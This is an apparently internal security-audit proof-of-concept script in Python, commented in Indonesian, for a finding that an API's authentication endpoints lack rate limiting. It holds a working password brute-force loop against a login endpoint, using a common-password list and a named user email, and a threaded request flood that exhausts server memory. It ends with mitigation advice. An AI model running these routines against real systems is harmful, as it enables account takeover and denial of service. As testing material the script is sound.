#!/usr/bin/env python3
"""
PoC: MEDIUM-009 — Tidak Ada Rate Limiting di Auth Endpoints
============================================================
Demonstrasi bahwa endpoint /auth/token tidak memiliki rate limiting
sehingga brute force credential dapat dilakukan tanpa hambatan.

Juga menunjukkan state flooding pada /auth/get-azure-sso-url yang
dapat menyebabkan memory exhaustion (amplifikasi dari HIGH-001).

CARA MENJALANKAN:
  pip install requests
  python MEDIUM-009-no-rate-limiting.py [--mode brute|flood|both]

SAFETY: Mode brute menggunakan email yang pasti salah password.
        Mode flood sangat ringan (50 requests) — aman di DEV.
        JANGAN jalankan di production.
"""

import time
import sys
import argparse
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

try:
    import requests
except ImportError:
    print("Install dulu: pip install requests")
    sys.exit(1)

# ──────────────────────────────────────────────
# KONFIGURASI
# ──────────────────────────────────────────────
API_BASE = "http://localhost:8000/api/v1"

# Email yang pasti ada tapi password salah (untuk demo brute force detection)
EXISTING_USER_EMAIL = "test.user@kpc.co.id"

# Password yang akan dicoba (jelas salah — untuk demo saja)
FAKE_PASSWORDS = [
    "password123", "Password123!", "kpc2024", "Admin@123",
    "Test1234!", "Passw0rd", "qwerty123", "abc123!@#",
    "KPC2024!", "Welcome1", "P@ssword1", "Summer2024!",
]


def separator(title: str):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}")


def demo_brute_force_no_lockout(n_attempts: int = 12):
    """
    Demonstrasi: coba N password berbeda tanpa ada rate limiting.
    Server tidak pernah memblokir atau melambat response.
    """
    separator("MEDIUM-009 DEMO A — Brute Force Tanpa Rate Limiting")
    print(
        f"""
  SKENARIO:
  Attacker mengetahui email target: {EXISTING_USER_EMAIL}
  Attacker mencoba {n_attempts} password berbeda.
  
  YANG DIBUKTIKAN:
  • Server tidak memblokir setelah N gagal
  • Response time tidak meningkat (tidak ada delay/tarpit)
  • Tidak ada CAPTCHA atau challenge setelah gagal berkali-kali
  • Tidak ada notifikasi ke user tentang percobaan login gagal
"""
    )

    print(f"  {'#':>4} | {'Password':<20} | {'Status':>6} | {'Time (s)':>8} | Respons")
    print(f"  {'-'*4}-+-{'-'*20}-+-{'-'*6}-+-{'-'*8}-+-----------")

    results = []
    for i, pwd in enumerate(FAKE_PASSWORDS[:n_attempts], 1):
        start = time.time()
        try:
            resp = requests.post(
                f"{API_BASE}/auth/token",
                data={"username": EXISTING_USER_EMAIL, "password": pwd},
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=5,
            )
            elapsed = time.time() - start

            if resp.status_code == 200:
                status_color = "\033[92m"
                label = "SUCCESS (password found!)"
            elif resp.status_code == 401:
                status_color = "\033[93m"
                label = "Wrong password"
            elif resp.status_code == 429:
                status_color = "\033[92m"
                label = "RATE LIMITED (fix sudah ada!)"
            else:
                status_color = ""
                label = f"HTTP {resp.status_code}"

            reset = "\033[0m"
            print(
                f"  {i:>4} | {pwd:<20} | "
                f"{status_color}{resp.status_code:>6}{reset} | "
                f"{elapsed:>8.3f} | {label}"
            )
            results.append({
                "attempt": i,
                "password": pwd,
                "status": resp.status_code,
                "elapsed": elapsed,
                "rate_limited": resp.status_code == 429,
            })

            if resp.status_code == 200:
                print("\n  \033[91m!!! PASSWORD DITEMUKAN — AKUN BERHASIL DIBOBOL !!!\033[0m")
                break

        except requests.exceptions.ConnectionError:
            print(f"  {i:>4} | {pwd:<20} | ERROR  | N/A      | Tidak bisa konek ke server")
            break
        except requests.exceptions.Timeout:
            print(f"  {i:>4} | {pwd:<20} | TIMEOUT| N/A      | Timeout")

    # Analisis
    rate_limited = [r for r in results if r.get("rate_limited")]
    elapsed_times = [r["elapsed"] for r in results]
    avg_time = sum(elapsed_times) / len(elapsed_times) if elapsed_times else 0

    print(f"\n  {'─'*55}")
    print(f"  Total percobaan  : {len(results)}")
    print(f"  Rate limited     : {len(rate_limited)} kali")
    print(f"  Avg response time: {avg_time:.3f}s")

    if not rate_limited:
        print(
            f"\n  \033[91m╔══════════════════════════════════════════════════╗\033[0m"
        )
        print(
            f"  \033[91m║  VULNERABILITY CONFIRMED: Tidak ada rate limit! ║\033[0m"
        )
        print(
            f"  \033[91m║  {len(results)} percobaan — server tidak pernah memblokir  ║\033[0m"
        )
        print(
            f"  \033[91m╚══════════════════════════════════════════════════╝\033[0m"
        )
        print(
            f"\n  Estimasi: Attacker bisa coba ~{int(60/avg_time)} password/menit"
            if avg_time > 0
            else ""
        )
        print(
            f"  Dengan wordlist 10.000 kata: "
            f"~{int(10000//(60/avg_time))} menit untuk selesai"
            if avg_time > 0
            else ""
        )
    else:
        print(f"\n  \033[92m Rate limiting sudah aktif — server menolak setelah beberapa percobaan.\033[0m")


def demo_state_flooding(n_requests: int = 50):
    """
    Demonstrasi ringan: kirim banyak request ke /get-azure-sso-url
    Setiap request menambah entry ke auth_states dict (memory leak amplifier).
    """
    separator("MEDIUM-009 DEMO B — State Flooding (Memory Amplifier)")
    print(
        f"""
  SKENARIO:
  Attacker mengirim {n_requests} request ke /auth/get-azure-sso-url.
  Setiap request menambah entry ke in-memory auth_states dict.
  
  KOMBINASI DENGAN HIGH-001:
  • HIGH-001: auth_states disimpan in-memory tanpa expiry
  • MEDIUM-009: tidak ada rate limit pada endpoint ini
  → Attacker bisa mengisi RAM server tanpa batas!
  
  NOTE: Demo ringan saja ({n_requests} requests) — tidak sampai crash server.
        Di dunia nyata, attacker bisa kirim jutaan requests.
"""
    )

    start = time.time()
    success_count = 0
    error_count = 0

    print(f"  Mengirim {n_requests} requests ke /auth/get-azure-sso-url...")

    def send_request(i: int) -> bool:
        try:
            resp = requests.get(
                f"{API_BASE}/auth/get-azure-sso-url",
                params={"redirect_uri": "http://localhost:3000"},
                timeout=5,
            )
            return resp.status_code == 200
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(send_request, i) for i in range(n_requests)]
        for f in futures:
            if f.result():
                success_count += 1
            else:
                error_count += 1

    elapsed = time.time() - start
    entries_added = success_count  # Setiap sukses = 1 entry di auth_states

    print(f"\n  Selesai dalam {elapsed:.2f}s")
    print(f"  Request berhasil: {success_count}")
    print(f"  Request gagal   : {error_count}")
    print(f"  Estimasi entries di auth_states: {entries_added}")
    print(f"  Estimasi memory: ~{entries_added * 500} bytes ({entries_added * 500 / 1024:.1f} KB)")

    print(
        f"""
  PROYEKSI SERANGAN NYATA:
  • 50 req/s (mudah dicapai) × 3600s = 180.000 entries/jam
  • 180.000 × 500 bytes = ~90 MB per jam
  • Dalam 24 jam: ~2.16 GB RAM terbuang
  • Server biasanya crash atau OOM killer membunuh proses
  
  TANPA rate limiting: serangan ini bisa dilakukan dari satu laptop.
"""
    )


def demo_no_lockout_account():
    """Tunjukkan tidak ada account lockout."""
    separator("MEDIUM-009 DEMO C — Tidak Ada Account Lockout")
    print(
        """
  VERIFIKASI: Apakah ada account lockout setelah banyak percobaan gagal?

  Cara verifikasi manual:
  1. Jalankan 20+ percobaan login gagal untuk satu akun
  2. Perhatikan apakah response berubah (delay, locked, CAPTCHA)
  3. Cek di database: tidak ada tabel 'login_attempts' atau 'account_locks'

  Cek di codebase:
  → grep -r "lockout" app/ → TIDAK DITEMUKAN
  → grep -r "login_attempt" app/ → TIDAK DITEMUKAN
  → grep -r "rate_limit" app/ → TIDAK DITEMUKAN
  → grep -r "slowloris\|tarpit\|backoff" app/ → TIDAK DITEMUKAN

  KESIMPULAN: Tidak ada mekanisme lockout apapun di codebase.
"""
    )


def main():
    parser = argparse.ArgumentParser(description="MEDIUM-009 Rate Limiting PoC")
    parser.add_argument(
        "--mode",
        choices=["brute", "flood", "both"],
        default="both",
        help="Mode demo: brute=credential test, flood=state flooding",
    )
    parser.add_argument(
        "--attempts",
        type=int,
        default=12,
        help="Jumlah percobaan brute force (default: 12)",
    )
    parser.add_argument(
        "--flood-requests",
        type=int,
        default=50,
        help="Jumlah requests untuk state flooding (default: 50)",
    )
    args = parser.parse_args()

    separator("MEDIUM-009 PoC — No Rate Limiting on Auth Endpoints")
    print(
        """
  FINDING: Tidak ada rate limiting di seluruh auth endpoints.
  DAMPAK: Brute force, state flooding, DoS via callback spam.
  
  DEMO INI AMAN: Menggunakan password yang jelas salah,
  dan jumlah request yang sangat terbatas.
"""
    )

    if args.mode in ("brute", "both"):
        demo_brute_force_no_lockout(args.attempts)
        time.sleep(1)

    if args.mode in ("flood", "both"):
        demo_state_flooding(args.flood_requests)
        time.sleep(1)

    demo_no_lockout_account()

    separator("RINGKASAN REKOMENDASI")
    print(
        """
  1. Pasang rate limiter di auth endpoints:
     - /auth/token: max 5 req/menit per IP
     - /auth/get-azure-sso-url: max 10 req/menit per IP
     - /auth/callback: max 20 req/menit per IP

  2. Implementasi account lockout:
     - Setelah 5 gagal: lockout 15 menit
     - Alert ke user via email

  3. Library yang direkomendasikan:
     - slowapi (FastAPI-compatible rate limiter)
     - atau nginx/API Gateway rate limiting (layer sebelum app)
"""
    )


if __name__ == "__main__":
    main()
